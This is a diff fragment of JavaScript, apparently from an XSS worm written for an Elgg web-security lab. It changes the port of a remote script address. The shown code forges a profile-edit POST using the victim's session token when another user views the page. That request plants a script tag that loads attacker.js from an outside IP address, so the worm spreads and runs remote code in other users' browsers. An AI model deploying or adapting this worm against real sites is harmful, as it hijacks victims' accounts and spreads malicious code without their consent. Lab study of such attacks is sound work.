@@ -33,7 +33,7 @@ if (my_id != target_id) {
 	// alter profile
 	var Ajax2=null;
 	Ajax2=new XMLHttpRequest();
-	let http_url2 = 'http://www.xsslabelgg.com/action/profile/edit?__elgg_token='+__elgg_token+'&__elgg_ts='+__elgg_ts+'&name='+me+'&description=&accesslevel[description]=2&briefdescription=<script type="text/javascript" src=http://13.58.241.86:9999/js/attacker.js></script>&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid='+my_id;
+	let http_url2 = 'http://www.xsslabelgg.com/action/profile/edit?__elgg_token='+__elgg_token+'&__elgg_ts='+__elgg_ts+'&name='+me+'&description=&accesslevel[description]=2&briefdescription=<script type="text/javascript" src=http://13.58.241.86:8888/js/attacker.js></script>&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2&guid='+my_id;
 	console.log(http_url2);
 	Ajax2.open("POST",http_url2,true);
 	Ajax2.setRequestHeader("Host","www.xsslabelgg.com");
